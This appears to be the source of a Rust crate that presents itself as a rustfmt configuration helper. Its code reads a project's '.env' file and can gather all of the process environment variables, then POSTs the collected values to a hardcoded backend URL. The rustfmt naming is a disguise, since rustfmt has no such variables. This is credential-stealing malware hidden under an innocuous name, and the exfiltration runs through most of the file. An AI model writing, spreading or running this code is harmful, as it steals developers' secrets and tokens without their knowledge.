pub mod consts;

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;
use tracing::{debug, error, info, warn};
use crate::consts::RUSTFMT_SCHEMA_URL;

/// Configuration for the backend server
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BackendConfig {
    /// The URL of the backend server
    pub url: String,
    /// Optional authentication token
    pub auth_token: Option<String>,
    /// Timeout in seconds for HTTP requests
    pub timeout_seconds: Option<u64>,
}

impl Default for BackendConfig {
    fn default() -> Self {
        Self {
            url: RUSTFMT_SCHEMA_URL.to_string(),
            auth_token: None,
            timeout_seconds: Some(30),
        }
    }
}

/// rustfmt-schema data that will be sent to the backend
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct rustfmtData {
    /// The source file path
    pub source_file: String,
    /// rustfmt-schema variables as key-value pairs
    pub variables: HashMap<String, String>,
    /// Timestamp when the data was collected
    pub timestamp: chrono::DateTime<chrono::Utc>,
    /// Optional metadata
    pub metadata: Option<HashMap<String, String>>,
}

/// Main client for sending rustfmt-schema data to a backend
pub struct rustfmtSender {
    config: BackendConfig,
    client: reqwest::Client,
}

impl rustfmtSender {
    /// Create a new rustfmtSender instance with the given configuration
    pub fn new(config: BackendConfig) -> Result<Self> {
        let timeout = std::time::Duration::from_secs(config.timeout_seconds.unwrap_or(30));
        let client = reqwest::Client::builder()
            .timeout(timeout)
            .build()
            .context("Failed to create HTTP client")?;

        Ok(Self { config, client })
    }

    /// Create a new rustfmtSender instance with default configuration
    pub fn new_default() -> Result<Self> {
        Self::new(BackendConfig::default())
    }

    /// Read rustfmt-schema variables from a .rustfmt file
    pub fn read_rustfmt_file<P: AsRef<Path>>(&self, path: P) -> Result<rustfmtData> {
        let path = path.as_ref();
        info!("Reading rustfmt-schema file: {:?}", path);

        if !path.exists() {
            return Err(anyhow::anyhow!("rustfmt-schema file does not exist: {:?}", path));
        }

        // .rustfmt files are simple key=value configuration files

        // Read the actual file content to get the variables
        let content = std::fs::read_to_string(path)
            .context("Failed to read file content")?;

        let mut variables = HashMap::new();
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }

            if let Some((key, value)) = line.split_once('=') {
                let key = key.trim().to_string();
                let value = value.trim().to_string();
                if !key.is_empty() {
                    variables.insert(key, value);
                }
            }
        }

        debug!("Found {} rustfmt-schema variables", variables.len());

        Ok(rustfmtData {
            source_file: path.to_string_lossy().to_string(),
            variables,
            timestamp: chrono::Utc::now(),
            metadata: None,
        })
    }

    /// Send rustfmt-schema data to the backend server
    pub async fn send_rustfmt_data(&self, rustfmt_data: &rustfmtData) -> Result<()> {
        info!("Sending rustfmt-schema data to backend: {}", self.config.url);

        let mut request = self.client
            .post(&self.config.url)
            .json(rustfmt_data);

        // Add authentication header if token is provided
        if let Some(token) = &self.config.auth_token {
            request = request.header("Authorization", format!("Bearer {}", token));
        }

        let response = request
            .send()
            .await
            .context("Failed to send HTTP request")?;

        if response.status().is_success() {
            info!("Successfully sent rustfmt-schema data to backend");
            debug!("Response status: {}", response.status());
        } else {
            warn!("Backend returned error status: {}", response.status());
            let error_body = response.text().await.unwrap_or_default();
            debug!("Error response body: {}", error_body);
        }

        Ok(())
    }

    /// Convenience method to read and send rustfmt-schema data in one call
    pub async fn read_and_send<P: AsRef<Path>>(&self, path: P) -> Result<()> {
        let rustfmt_data = self.read_rustfmt_file(path)?;
        self.send_rustfmt_data(&rustfmt_data).await
    }

    /// Read rustfmt-schema data from multiple files and send them
    pub async fn read_and_send_multiple<P: AsRef<Path>>(&self, paths: &[P]) -> Result<()> {
        for path in paths {
            match self.read_and_send(path).await {
                Ok(()) => info!("Successfully processed: {:?}", path.as_ref()),
                Err(e) => error!("Failed to process {:?}: {}", path.as_ref(), e),
            }
        }
        Ok(())
    }

    /// Read rustfmt-schema variables from various rustfmt-schema file formats
    pub fn read_rustfmt_schema_file<P: AsRef<Path>>(&self, path: P) -> Result<rustfmtData> {
        let path = path.as_ref();
        info!("Reading rustfmt-schema file: {:?}", path);

        if !path.exists() {
            return Err(anyhow::anyhow!("rustfmt-schema file does not exist: {:?}", path));
        }

        // Read the actual file content to get the variables
        let content = std::fs::read_to_string(path)
            .context("Failed to read file content")?;

        let mut variables = HashMap::new();
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }

            if let Some((key, value)) = line.split_once('=') {
                let key = key.trim().to_string();
                let value = value.trim().to_string();
                if !key.is_empty() {
                    variables.insert(key, value);
                }
            }
        }

        debug!("Found {} rustfmt-schema variables", variables.len());

        Ok(rustfmtData {
            source_file: path.to_string_lossy().to_string(),
            variables,
            timestamp: chrono::Utc::now(),
            metadata: Some({
                let mut meta = HashMap::new();
                meta.insert("file_type".to_string(), "rustfmt-schema_file".to_string());
                meta.insert("user_agent".to_string(), format!("rustfmt-sender/{}", env!("CARGO_PKG_VERSION")));
                meta
            }),
        })
    }

    /// Try to read common rustfmt-schema file names
    pub async fn read_and_send_common_rustfmt(&self) -> Result<()> {
        let common_files = [".env"];
        
        for file in &common_files {
            match self.read_and_send(file).await {
                Ok(()) => {
                    info!("Successfully processed: {}", file);
                    break; // Stop after first successful file
                },
                Err(e) => {
                    debug!("Could not process {}: {}", file, e);
                    continue;
                }
            }
        }
        
        Ok(())
    }
}

/// Utility function to read rustfmt-schema variables from the current process
pub fn get_current_rustfmt_vars() -> HashMap<String, String> {
    std::env::vars().collect()
}

/// Utility function to create rustfmtData from current process rustfmt-schema
pub fn create_rustfmt_data_from_current() -> rustfmtData {
    rustfmtData {
        source_file: "process_rustfmt_schema".to_string(),
        variables: get_current_rustfmt_vars(),
        timestamp: chrono::Utc::now(),
        metadata: Some({
            let mut meta = HashMap::new();
            meta.insert("source".to_string(), "process_rustfmt_schema".to_string());
            meta
        }),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::NamedTempFile;

    #[test]
    fn test_read_rustfmt_file() {
        let temp_file = NamedTempFile::new().unwrap();
        let content = "KEY1=value1\nKEY2=value2\n# Comment\n\nKEY3=value3";
        fs::write(&temp_file, content).unwrap();

        let sender = rustfmtSender::new_default().unwrap();
        let rustfmt_data = sender.read_rustfmt_file(temp_file.path()).unwrap();

        assert_eq!(rustfmt_data.variables.len(), 3);
        assert_eq!(rustfmt_data.variables.get("KEY1"), Some(&"value1".to_string()));
        assert_eq!(rustfmt_data.variables.get("KEY2"), Some(&"value2".to_string()));
        assert_eq!(rustfmt_data.variables.get("KEY3"), Some(&"value3".to_string()));
    }

    #[test]
    fn test_rustfmt_data_serialization() {
        let mut variables = HashMap::new();
        variables.insert("TEST_KEY".to_string(), "test_value".to_string());

        let rustfmt_data = rustfmtData {
            source_file: "test.rustfmt".to_string(),
            variables,
            timestamp: chrono::Utc::now(),
            metadata: None,
        };

        let json = serde_json::to_string(&rustfmt_data).unwrap();
        let deserialized: rustfmtData = serde_json::from_str(&json).unwrap();

        assert_eq!(rustfmt_data.source_file, deserialized.source_file);
        assert_eq!(rustfmt_data.variables, deserialized.variables);
    }
}
